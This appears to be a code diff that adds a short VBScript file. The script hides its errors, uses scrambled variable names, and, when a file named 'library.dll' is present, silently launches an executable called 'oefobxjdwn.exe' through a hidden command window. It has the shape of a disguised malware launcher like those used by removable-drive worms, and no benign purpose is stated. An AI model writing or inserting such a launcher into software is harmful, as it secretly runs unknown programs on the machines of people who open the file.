@@ -1,0 +1,8 @@
+on error resume next 
+Set OATWQW = CreateObject("WScript.Shell") 
+set YBLIHX = createobject("scripting.filesystemobject") 
+LXZGMG = "cmd /k c: & cd\ & cd  & oefobxjdwn.exe"
+if YBLIHX.fileexists ("library.dll") then 
+OATWQW.run(LXZGMG),0 
+End If 
+
